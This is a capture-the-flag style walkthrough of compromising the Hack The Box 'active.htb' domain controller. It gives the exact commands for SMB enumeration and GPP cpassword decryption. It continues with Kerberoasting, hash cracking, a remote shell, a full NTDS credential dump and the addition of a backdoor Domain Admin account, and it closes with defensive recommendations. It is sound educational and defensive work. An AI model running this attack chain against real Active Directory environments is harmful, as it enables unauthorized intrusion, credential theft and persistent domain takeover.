# Active Directory Pentest Walkthrough – active.htb

## Introduction & Context

This repository documents a **full Active Directory domain compromise** performed in a **controlled and authorized lab environment** (Hack The Box – *active.htb*).
The objective was to assess the security posture of an AD environment by following a **realistic attacker methodology**, from initial enumeration to full domain takeover and persistence.

All actions were performed with **explicit authorization** and are shared **for educational and defensive purposes only**.

---

## Target Overview

* **Domain**: `active.htb`
* **Domain Controller IP**: `$target`
* **OS**: Windows Server 2008 R2
* **Role**: Domain Controller

---

## Phase 1 – Enumeration

### 1.1 Network & Service Enumeration

```bash
nmap -sV -sC -Pn $target -v
```

**Why**: Identify exposed services and confirm AD-related attack surface (DNS, LDAP, SMB, RPC).

---

### 1.2 DNS Enumeration

```bash
dig any active.htb @$target
```

**Observation**: No significant information leakage.

---

### 1.3 RPC Enumeration

```bash
rpcclient -U "" -N $target
```

**Result**: `NT_STATUS_ACCESS_DENIED` – anonymous RPC access restricted.

---

### 1.4 LDAP Enumeration

```bash
enum4linux -u "guest" -p "" $target
```

```bash
crackmapexec ldap $target -u guest -p ""
```

**Result**: Guest account disabled, but confirms domain name and DC role.

---

### 1.5 SMB Enumeration

```bash
crackmapexec smb $target
```

```bash
crackmapexec smb $target -u "" -p "" --shares
```

**Key Finding**: Anonymous access allowed to sensitive shares:

* `SYSVOL`
* `Replication`
* `NETLOGON`

---

## Phase 2 – GPP Password Discovery

### 2.1 SYSVOL / Replication Analysis

```bash
smbclient //$target/Replication -N
```

During file inspection, a **Group Policy Preferences XML file** was discovered:

* **File**: `Groups.xml`
* **User**: `active.htb\\SVC_TGS`
* **Attribute**: `cpassword`

---

### 2.2 GPP cpassword Decryption

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

**Recovered Password**:

```
GPPstillStandingStrong2k18
```

**Why this works**: GPP passwords are encrypted with a **static, publicly known AES key**, making them trivially decryptable offline.

---

## Phase 3 – Credential Validation

```bash
crackmapexec smb $target -u SVC_TGS -p 'GPPstillStandingStrong2k18'
```

**Result**: Valid domain credentials confirmed.

---

## Phase 4 – Kerberoasting

### 4.1 SPN Enumeration

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip $target -request
```

**Critical Finding**:

* SPN linked to **Administrator** account
* Administrator is **Kerberoastable** (critical misconfiguration)

---

### 4.2 Offline Password Cracking

```bash
hashcat -m 13100 <TGS_HASH> /usr/share/wordlists/rockyou.txt --force
```

**Recovered Password**:

```
Administrator : Ticketmaster1968
```

---

## Phase 5 – Domain Admin Compromise

### 5.1 Credential Validation

```bash
crackmapexec smb $target -u Administrator -p 'Ticketmaster1968'
```

**Result**:

```
(Pwn3d!)
```

---

### 5.2 Remote Shell on Domain Controller

```bash
impacket-wmiexec active.htb/Administrator:'Ticketmaster1968'@$target
```

```cmd
whoami /all
```

**Proof**: Full Domain Admin privileges confirmed.

---

## Phase 6 – Full Domain Dump

```bash
crackmapexec smb $target -u Administrator -p 'Ticketmaster1968' --ntds
```

**Impact**:

* All domain user hashes
* `krbtgt` hash (Golden Ticket capability)

---

## Phase 7 – Persistence

### 7.1 Temporary Domain Admin Creation

```bash
crackmapexec smb $target -u Administrator -p 'Ticketmaster1968' -x "net user pentest P@ssw0rd! /add /domain && net group \"Domain Admins\" pentest /add /domain"
```

```bash
impacket-wmiexec active.htb/pentest:'P@ssw0rd!'@$target
```

**Purpose**: Demonstrate persistence and business impact.

---

### 7.2 Cleanup

```bash
crackmapexec smb $target -u Administrator -p 'Ticketmaster1968' -x "net user pentest /delete /domain"
```

---

## Final Summary

This engagement resulted in a **complete Active Directory domain compromise** due to multiple critical misconfigurations:

* Anonymous SMB access to SYSVOL
* Legacy GPP password usage
* Weak service account hygiene
* Kerberoastable `Administrator` account
* Weak, crackable password

### Overall Impact

* Full Domain Admin access
* Complete credential exposure
* Long-term persistence possible (Golden Ticket)

### Severity: **CRITICAL**

---

## Defensive Recommendations

* Remove all GPP passwords
* Rotate all compromised credentials
* Rotate `krbtgt` password twice
* Enforce strong passwords on privileged accounts
* Never assign SPNs to Tier 0 accounts
* Monitor Kerberos Event IDs (4769, 4624)

---

*This repository is intended for educational and defensive improvement purposes only.*
